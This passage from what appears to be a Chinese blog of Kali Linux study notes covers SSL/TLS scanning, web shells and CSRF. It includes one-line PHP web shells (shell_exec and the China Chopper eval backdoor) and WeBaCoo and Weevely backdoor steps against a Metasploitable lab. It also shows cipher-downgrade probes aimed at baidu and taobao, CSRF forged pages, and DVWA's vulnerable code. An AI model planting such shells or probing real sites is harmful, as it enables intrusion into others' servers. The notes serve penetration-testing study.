<li>1994年由Netscape开发成为统一标准</li>
<li>1999年TLS（transport layer security）取代SSL v3</li>
<li>近年来发现的SSL协议漏洞使业界认为其漏洞已不可软件修复<ul>
<li>Heartbleed</li>
<li>POODLE</li>
<li>BEAST</li>
</ul>
</li>
<li>TLS当前最新版本1.2</li>
<li>TLS/SSL、HTTPS、HTTP over SSL通俗上表示同意含义</li>
<li>SSL/TLS也被用于其他场景的传输通道加密<ul>
<li>邮件传输（服务器间、客户端与服务期间,SMTP/POP3为明文协议）</li>
<li>数据库服务器间</li>
<li>LDAP身份认证服务器</li>
<li>SSL VPN</li>
<li>远程桌面RDP通信过程中的加密和身份认证</li>
</ul>
</li>
</ul>
<h4 id="3-SSL加密"><a href="#3-SSL加密" class="headerlink" title="3. SSL加密"></a>3. SSL加密</h4><ul>
<li>WEB通信中的SSL加密（PKI体系架构）<ul>
<li>公钥证书（受信任的第三方证书颁发机构签名颁发）</li>
<li>VeriSign</li>
<li>Thawte</li>
<li>GlobalSign</li>
<li>Symantec</li>
</ul>
</li>
<li>加密过程<ul>
<li>握手、协商加密算法、获取公钥证书、验证公钥证书、交换会话密钥、加密信息传输</li>
<li>加密套件（Cipher Suite：对称加密+非对称加密+单向加密+密钥算法）</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>⭐加密信息传输过程（哈希值用于数据传输的完整性）
1.用交换的对称密钥对明文进行加密
2.对加密的明文进行哈希计算，得出一串额外的字符串
3.对字符串进行服务器私钥加密
▲ 存在疑问4.加密过程中，将对称密码加密的明文+哈希值+加密后的哈希值一起传给对方
⭐加密信息解密过程
1.用服务器公钥对哈希值进行解密，得出哈希值H2
2.用交换的对称密钥对对称密钥加密的字段进行解密，并计算哈希值H1
3.比对哈希值H1和H2的值是否相等，保证了数据的完整性和身份认证</code></pre></blockquote>
<h4 id="4-加密算法"><a href="#4-加密算法" class="headerlink" title="4. 加密算法"></a>4. 加密算法</h4><ul>
<li>非对称加密算法<ul>
<li>Diffie-Hellman Key exchange（密钥交换）</li>
<li>Rivest Shamir Adleman（RSA）</li>
<li>Elliptic Curve Cryptography（ECC）</li>
</ul>
</li>
<li>对称加密算法<ul>
<li>Data Encryption Standard（DES/3DES）</li>
<li>Advance Encryption Standard（AES）</li>
<li>International Data Encryption Algorithm（IDEA）</li>
<li>Rivest Cipher 4（RC4）<ul>
<li>WEP、TLS/SSL、RDP、Secure shell</li>
</ul>
</li>
</ul>
</li>
<li>单向加密算法（hash算法）<ul>
<li>SHA-3已经设计完成，但尚未广泛使用</li>
<li>SHA-2是TLS1.2唯一支持的单向加密算法</li>
<li>碰撞攻击针对单向加密算法<ul>
<li>两个不同的文件生成相同的HASH值</li>
</ul>
</li>
</ul>
</li>
</ul>
<table>
<thead>
<tr>
<th align="center">HASH算法</th>
<th align="center">HASH值长度（bit）</th>
</tr>
</thead>
<tbody><tr>
<td align="center">MD5</td>
<td align="center">128</td>
</tr>
<tr>
<td align="center">SHA-1</td>
<td align="center">160</td>
</tr>
<tr>
<td align="center">SHA-2</td>
<td align="center">224、256、384、512</td>
</tr>
</tbody></table>
<h4 id="5-SSL的弱点"><a href="#5-SSL的弱点" class="headerlink" title="5. SSL的弱点"></a>5. SSL的弱点</h4><ul>
<li>SSL是不同的对称、非对称、单向加密算法的组合加密实现（cipher suite）</li>
</ul>
<table>
<thead>
<tr>
<th align="center">加密算法</th>
<th align="center">SSL实现中的用途</th>
</tr>
</thead>
<tbody><tr>
<td align="center">RAS/Diffie-Hellman</td>
<td align="center">密钥交换、身份认证</td>
</tr>
<tr>
<td align="center">AES</td>
<td align="center">加密数据，由RAS/DH完成密钥交换</td>
</tr>
<tr>
<td align="center">HMAC-SHA2</td>
<td align="center">摘要信息</td>
</tr>
</tbody></table>
<ul>
<li>服务器端为提供更好的兼容性，选择支持大量过时的cipher suite</li>
<li>协商过程中强迫降级加密强度</li>
<li>现代处理器计算能力可以在可接受的时间内破解时加密算法</li>
<li>购买云计算资源破解</li>
</ul>
<h4 id="6-Openssl"><a href="#6-Openssl" class="headerlink" title="6. Openssl"></a>6. Openssl</h4><ul>
<li>直接调用openssl库识别目标服务器支持的SSL/TLS cipher suite</li>
<li><strong><code>🔺命令：openssl s_client -connect www.baidu.com:443</code></strong></li>
<li><strong><code>🔺命令：openssl s_client -tls1_2 -cipher &#39;ECDH-RSA-RC4-SHA&#39; -connect www.taobao.com:443</code></strong> ▲ 2020.1.22 SSL routines:SSL_CTX_set_cipher_list:no cipher match<ul>
<li>▲ 密钥交换–身份认证–数据加密–HASH算法</li>
</ul>
</li>
<li><strong><code>🔺命令：openssl s_client -tls1_2 -cipher &quot;NULL,EXPORT,LOW,DES&quot; -connect www.taobao.com:443</code></strong>（协商低安全级别cipher suite）</li>
<li>可被破解的cipher suite<ul>
<li><strong><code>🔺命令：openssl ciphers -v &quot;NULL,EXPORT,LOW,DES&quot;</code></strong></li>
</ul>
</li>
<li><a href="https://www.openssl.org/docs/apps/ciphers.html" target="_blank" rel="noopener">https://www.openssl.org/docs/apps/ciphers.html</a> （cipher suite的组合）</li>
<li>Openssl需要大量的密码学相关知识，命令复杂，结果可读性差</li>
</ul>
<h4 id="7-SSLScan"><a href="#7-SSLScan" class="headerlink" title="7. SSLScan"></a>7. SSLScan</h4><ul>
<li>自动识别SSL配置错误、过期协议、过时cipher suite和hash算法</li>
<li>默认会检查新浪CRIME、heartbleed漏洞</li>
<li>TLS支持的cipher suite<ul>
<li><strong><code>🔺命令：sslscan --tlsall www.taobao.com:443</code></strong></li>
</ul>
</li>
<li>分析证书详细数据<ul>
<li><strong><code>🔺命令：sslscan --show-certificate --no-ciphersuites www.taobao.com:443</code></strong></li>
</ul>
</li>
</ul>
<h4 id="8-SSLyze"><a href="#8-SSLyze" class="headerlink" title="8. SSLyze"></a>8. SSLyze</h4><ul>
<li>Python语言编写</li>
<li>检查SSL过时版本</li>
<li>检查存在弱点的cipher suite</li>
<li>扫描多站点时，支持来源文件</li>
<li>检查是否支持会话恢复</li>
<li><strong><code>🔺命令：sslyze --regular www.baidu.com:443</code></strong></li>
</ul>
<h4 id="9-Nmap"><a href="#9-Nmap" class="headerlink" title="9. Nmap"></a>9. Nmap</h4><ul>
<li><strong><code>🔺命令：nmap --script=ssl-enum-ciphers.nse www.taobao.com</code></strong></li>
</ul>
<h4 id="10-QUALYS-SSL-LABS"><a href="#10-QUALYS-SSL-LABS" class="headerlink" title="10. QUALYS SSL LABS"></a>10. QUALYS SSL LABS</h4><ul>
<li><a href="https://www.sslabs.com/ssltest/" target="_blank" rel="noopener">https://www.sslabs.com/ssltest/</a></li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/21/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81%E5%9B%9B)%EF%BC%9AWebShell/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/01/21/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81%E5%9B%9B)%EF%BC%9AWebShell/" itemprop="url">Kali Linux笔记(五十四)：WebShell</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-21T20:40:16+08:00">
                2020-01-21
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  706 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  3 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-WEBSHELL–浏览器"><a href="#1-WEBSHELL–浏览器" class="headerlink" title="1. WEBSHELL–浏览器"></a>1. WEBSHELL–浏览器</h4><ul>
<li>Shell<ul>
<li>ssh登陆到metasploitable</li>
<li><strong><code>🔺命令：vi a.php</code></strong></li>
<li><code>&lt;?php echo shell_exec($_GET[&#39;cmd&#39;]);?&gt;</code></li>
<li><strong><code>🔺命令：cp a.php /var/www</code></strong></li>
<li>浏览器访问a.php</li>
</ul>
</li>
</ul>
<h4 id="2-WEBSHELL–中国菜刀-▲-2020-1-21暂未使用"><a href="#2-WEBSHELL–中国菜刀-▲-2020-1-21暂未使用" class="headerlink" title="2. WEBSHELL–中国菜刀 ▲ 2020.1.21暂未使用"></a>2. WEBSHELL–中国菜刀 ▲ 2020.1.21暂未使用</h4><ul>
<li>中国菜刀：<a href="http://www.maicaidao.co/（使用unicode编码）" target="_blank" rel="noopener">http://www.maicaidao.co/（使用unicode编码）</a><ul>
<li>将代码新建到靶机上caidao.php</li>
<li><code>&lt;?php @eval(_POST[&#39;chopper&#39;]);?&gt;</code></li>
<li><strong><code>🔺命令：cp caidao.php /var/www</code></strong></li>
<li>菜刀服务端添加caidao.php的URL，进行配置，输入密码，执行</li>
</ul>
</li>
<li>WebShell可能被IDS、AV、WAF、扫描器软件发现查杀</li>
</ul>
<h4 id="3-WEBSHELL–WeBaCoo（PHP）"><a href="#3-WEBSHELL–WeBaCoo（PHP）" class="headerlink" title="3. WEBSHELL–WeBaCoo（PHP）"></a>3. WEBSHELL–WeBaCoo（PHP）</h4><ul>
<li>WeBaCoo（Web Backdoor Cookie）<ul>
<li>类终端的shell</li>
<li>编码通信内容通过cookie头传输，隐蔽性较强</li>
<li>cm：base64编码的命令</li>
<li>cn：服务器用于数据的cookie头的名（默认值）</li>
<li>cp：返回信息定界符（变化的定界符）</li>
<li>生成服务端</li>
</ul>
</li>
<li>生成服务端<ul>
<li><strong><code>🔺命令：webacoo -g -o webacoo.php</code></strong></li>
</ul>
</li>
<li>拷贝webacoo.php到服务器端<ul>
<li><strong><code>🔺命令：scp webacoo.php msfadmin@192.168.1.115:/home/msfadmin</code></strong></li>
<li>ssh登陆到metasploitable</li>
<li><strong><code>🔺命令：cp webacoo.php /var/www</code></strong></li>
</ul>
</li>
<li>客户端连接<ul>
<li><strong><code>🔺命令：webacoo -t -u &quot;http://1.1.1.1/webacoo.php&quot;</code></strong></li>
</ul>
</li>
<li>连接成功会出现命令提示符</li>
<li>抓包查看cookie</li>
<li>其他参数<ul>
<li>-g 生成服务器端代码</li>
<li>-f 添加执行php操作系统函数</li>
<li>-r 返回不进行混淆的代码</li>
<li>-t 远程建立terminal</li>
<li>-u webacoo URL</li>
<li>-e 单命令执行模式</li>
<li>-m HTTP通信方式（默认为Get）</li>
<li>-c 指定Cookie名字</li>
<li>-d 定界符</li>
<li>-a HTTP的user-agent</li>
<li>-p 代理服务</li>
<li>-l 记录日志</li>
<li>update 升级版本</li>
</ul>
</li>
</ul>
<h4 id="4-WEBSHELL–Weevely（PHP）"><a href="#4-WEBSHELL–Weevely（PHP）" class="headerlink" title="4. WEBSHELL–Weevely（PHP）"></a>4. WEBSHELL–Weevely（PHP）</h4><ul>
<li>隐藏的类终端PHP Webshell</li>
<li>30多个管理模块<ul>
<li>执行系统命令、测试文件系统</li>
<li>检查服务器常见配置错误</li>
<li>创建正向、反向TCP Shell连接</li>
<li>通过目标计算机代理HTTP流量</li>
<li>从目标计算机运行端口扫描，渗透内网</li>
</ul>
</li>
<li>支持连接密码</li>
<li>Kali缺少库 ▲ 2020.1.21已支持该库<ul>
<li><a href="https://pypi.python.org/pypi/PySocks/" target="_blank" rel="noopener">https://pypi.python.org/pypi/PySocks/</a></li>
<li><strong><code>🔺命令：./setup.py install</code></strong></li>
</ul>
</li>
<li>生成服务端<ul>
<li><strong><code>🔺命令：weevely generate &lt;password&gt; wee.php</code></strong> </li>
<li>/usr/share/weevely/wee.php ▲ 2020.1.21生成程序在终端所在位置</li>
</ul>
</li>
<li>拷贝wee.php到服务器端<ul>
<li><strong><code>🔺命令：scp wee.php msfadmin@192.168.1.115:/home/msfadmin</code></strong></li>
<li><strong><code>🔺命令：cp wee.php /var/www</code></strong></li>
</ul>
</li>
<li>客户端连接服务器<ul>
<li><strong><code>🔺命令：weevely http://1.1.1.1/wee.php &lt;password&gt;</code></strong></li>
</ul>
</li>
<li>抓包查看HTTP头（过滤：tcp.stream eq 5）</li>
<li>▲ 通过Referer、Cookie、body进行传输，解码可用Base64解码</li>
<li>help（查看模块）<ul>
<li>audit_sgidsgid（SUID+SGID）</li>
<li>audit_filesystem（查找文件设置权限）</li>
<li>audit_phpconf（审计php的配置信息）</li>
<li>system_info（操作系统配置）</li>
<li>backdoor_tcp（本地监听一个shell在TCP端口上）</li>
<li>backdoor_reversetcp（本地监听反弹一个shell）</li>
<li>bruteforce_sql（SQL注入的暴力破解）</li>
<li>net_proxy（把靶机变成代理服务器，但代理IP端口都设置在攻击者上）</li>
<li>net_phpproxy（php代理，需要安装一个php代理在靶机上）</li>
<li>net_scan IP:端口（把靶机作为扫描器）</li>
</ul>
</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/21/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81%E4%B8%89)%EF%BC%9ACSRF/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/01/21/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81%E4%B8%89)%EF%BC%9ACSRF/" itemprop="url">Kali Linux笔记(五十三)：CSRF</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-21T20:40:16+08:00">
                2020-01-21
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  1.1k 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  4 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-CSRF"><a href="#1-CSRF" class="headerlink" title="1. CSRF"></a>1. CSRF</h4><ul>
<li>Cross-site request forgery</li>
<li>与XSS经常混淆</li>
<li>从信任的角度来区分<ul>
<li>XSS：利用用户对站点的信任</li>
<li>CSRF：利用站点对已经身份认证的信任</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>⭐CSRF过程
1.客户端向服务器发送请求，获得身份认证Token
2.Hacker向客户端发送一个伪造定制页面，诱使客户端点击页面
3.客户端点击页面，页面通过客户端的Token提交数据指令给服务器端
4.服务器端未进行对请求来源的验证，只验证Session是否合法性
▲ 二次认证，随机数机制，验证码机制一定程度上可以防控CSRF漏洞</code></pre></blockquote>
<ul>
<li>结合社工在身份认证会话过程中实现攻击<ul>
<li>修改账号密码、个人信息（email、收获地址）</li>
<li>发送伪造的业务请求（网银、购物、投票）</li>
<li>关注他人社交账号，推送博文</li>
<li>▲ 在用户非自愿、不知情的情况下提交请求</li>
</ul>
</li>
<li>业务逻辑漏洞<ul>
<li>对关键操作缺少确认机制</li>
<li>自动扫描程序无法发现此类漏洞</li>
</ul>
</li>
<li>漏洞利用条件<ul>
<li>被害用户已经完成身份认证</li>
<li>新请求的提交不需要重新身份认证或确认机制</li>
<li>攻击者必须了解Web Application请求的参数构造</li>
<li>诱使用户触发攻击的指令（社工）</li>
</ul>
</li>
<li>▲ 自动扫描程序的检测方法<ul>
<li>在请求和响应过程中检查是否存在anti-CSRF token名（随机数验证）</li>
<li>检查服务器是否验证anti-CSRF token的名值（服务器端是否验证token正确性）</li>
<li>检查token中是否可编辑的字符串</li>
<li>检查referer头是否可以伪造</li>
</ul>
</li>
<li>对策<ul>
<li>Captcha（验证码机制）</li>
<li>anti-CSRF token（使用最广）</li>
<li>Referer头</li>
<li>降低会话超时时间</li>
</ul>
</li>
</ul>
<h4 id="2-CSRF–漏洞利用方法"><a href="#2-CSRF–漏洞利用方法" class="headerlink" title="2. CSRF–漏洞利用方法"></a>2. CSRF–漏洞利用方法</h4><ul>
<li>CSRF → Get方法<ul>
<li>Kali开启apach服务</li>
<li><strong><code>🔺命令：cd /var/www/html</code></strong> <strong><code>🔺命令：vi csrf-get.html</code></strong></li>
<li><code>&lt;a href=&quot;Burpsuit抓取的地址/URL地址抓取&quot;&gt;csrf&lt;/a&gt;</code></li>
<li>window上访问csrf-get.html</li>
</ul>
</li>
<li>CSRF → Post方法<ul>
<li>View Source查看页面的源代码</li>
<li>保存表单form的内容存成一个页面，csrf-post.html</li>
<li>诱使用户点击</li>
</ul>
</li>
<li>Burpsuit → 右键请求 → Engagement tools → Generate CSRF Poc ▲ 2020.1.21只有Burpsuite Professional版本才有此功能<ul>
<li>Burpsuit自动生成CSRF生成的一个页面</li>
<li><strong><code>🔺命令：cd /var/www/html</code></strong> <strong><code>🔺命令：vi csrf-post-burp.html</code></strong></li>
<li>window上访问csrf-post-burp.html</li>
</ul>
</li>
</ul>
<h4 id="3-CSRF–DVWA"><a href="#3-CSRF–DVWA" class="headerlink" title="3. CSRF–DVWA"></a>3. CSRF–DVWA</h4><ul>
<li>Dvwa中的CSRF（Low）<ul>
<li>多种绕过方式</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">                </span><br><span class="line">    if (isset($_GET[&apos;Change&apos;])) &#123;</span><br><span class="line">    </span><br><span class="line">        // Turn requests into variables</span><br><span class="line">        $pass_new = $_GET[&apos;password_new&apos;];</span><br><span class="line">        $pass_conf = $_GET[&apos;password_conf&apos;];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        if (($pass_new == $pass_conf))&#123;</span><br><span class="line">            $pass_new = mysql_real_escape_string($pass_new);</span><br><span class="line">            $pass_new = md5($pass_new);</span><br><span class="line"></span><br><span class="line">            $insert=&quot;UPDATE `users` SET password = &apos;$pass_new&apos; WHERE user = &apos;admin&apos;;&quot;;</span><br><span class="line">            $result=mysql_query($insert) or die(&apos;&lt;pre&gt;&apos; . mysql_error() . &apos;&lt;/pre&gt;&apos; );</span><br><span class="line">                        </span><br><span class="line">            echo &quot;&lt;pre&gt; Password Changed &lt;/pre&gt;&quot;;        </span><br><span class="line">            mysql_close();</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">        else&#123;        </span><br><span class="line">            echo &quot;&lt;pre&gt; Passwords did not match. &lt;/pre&gt;&quot;;            </span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>Dvwa中的CSRF（Medium）<ul>
<li>eregi()函数，取HTTP_REFERER进行比较判断</li>
<li>绕过方法：Burpsuite抓包截断进行修改HTTP头的Referer参数</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">            </span><br><span class="line">    if (isset($_GET[&apos;Change&apos;])) &#123;</span><br><span class="line">    </span><br><span class="line">        // Checks the http referer header</span><br><span class="line">        if ( eregi ( &quot;127.0.0.1&quot;, $_SERVER[&apos;HTTP_REFERER&apos;] ) )&#123;</span><br><span class="line">    </span><br><span class="line">            // Turn requests into variables</span><br><span class="line">            $pass_new = $_GET[&apos;password_new&apos;];</span><br><span class="line">            $pass_conf = $_GET[&apos;password_conf&apos;];</span><br><span class="line"></span><br><span class="line">            if ($pass_new == $pass_conf)&#123;</span><br><span class="line">                $pass_new = mysql_real_escape_string($pass_new);</span><br><span class="line">                $pass_new = md5($pass_new);</span><br><span class="line"></span><br><span class="line">                $insert=&quot;UPDATE `users` SET password = &apos;$pass_new&apos; WHERE user = &apos;admin&apos;;&quot;;</span><br><span class="line">                $result=mysql_query($insert) or die(&apos;&lt;pre&gt;&apos; . mysql_error() . &apos;&lt;/pre&gt;&apos; );</span><br><span class="line">                        </span><br><span class="line">                echo &quot;&lt;pre&gt; Password Changed &lt;/pre&gt;&quot;;        </span><br><span class="line">                mysql_close();</span><br><span class="line">            &#125;</span><br><span class="line">    </span><br><span class="line">            else&#123;        </span><br><span class="line">                echo &quot;&lt;pre&gt; Passwords did not match. &lt;/pre&gt;&quot;;            </span><br><span class="line">            &#125;    </span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>Dvwa中的CSRF（High）<ul>
<li>表单加入当前密码认证（二次认证）</li>
<li>基本无绕过方式</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">            </span><br><span class="line">    if (isset($_GET[&apos;Change&apos;])) &#123;</span><br><span class="line">    </span><br><span class="line">        // Turn requests into variables</span><br><span class="line">        $pass_curr = $_GET[&apos;password_current&apos;];</span><br><span class="line">        $pass_new = $_GET[&apos;password_new&apos;];</span><br><span class="line">        $pass_conf = $_GET[&apos;password_conf&apos;];</span><br><span class="line"></span><br><span class="line">        // Sanitise current password input</span><br><span class="line">        $pass_curr = stripslashes( $pass_curr );</span><br><span class="line">        $pass_curr = mysql_real_escape_string( $pass_curr );</span><br><span class="line">        $pass_curr = md5( $pass_curr );</span><br><span class="line">        </span><br><span class="line">        // Check that the current password is correct</span><br><span class="line">        $qry = &quot;SELECT password FROM `users` WHERE user=&apos;admin&apos; AND password=&apos;$pass_curr&apos;;&quot;;</span><br><span class="line">        $result = mysql_query($qry) or die(&apos;&lt;pre&gt;&apos; . mysql_error() . &apos;&lt;/pre&gt;&apos; );</span><br><span class="line"></span><br><span class="line">        if (($pass_new == $pass_conf) &amp;&amp; ( $result &amp;&amp; mysql_num_rows( $result ) == 1 ))&#123;</span><br><span class="line">            $pass_new = mysql_real_escape_string($pass_new);</span><br><span class="line">            $pass_new = md5($pass_new);</span><br><span class="line"></span><br><span class="line">            $insert=&quot;UPDATE `users` SET password = &apos;$pass_new&apos; WHERE user = &apos;admin&apos;;&quot;;</span><br><span class="line">            $result=mysql_query($insert) or die(&apos;&lt;pre&gt;&apos; . mysql_error() . &apos;&lt;/pre&gt;&apos; );</span><br><span class="line">                        </span><br><span class="line">            echo &quot;&lt;pre&gt; Password Changed &lt;/pre&gt;&quot;;        </span><br><span class="line">            mysql_close();</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">        else&#123;        </span><br><span class="line">            echo &quot;&lt;pre&gt; Passwords did not match or current password incorrect. &lt;/pre&gt;&quot;;            </span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/15/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81%E4%B8%80)%EF%BC%9ASQLMAP/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/01/15/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81%E4%B8%80)%EF%BC%9ASQLMAP/" itemprop="url">Kali Linux笔记(五十一)：SQLMAP</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-15T14:12:52+08:00">
                2020-01-15
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  3.2k 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
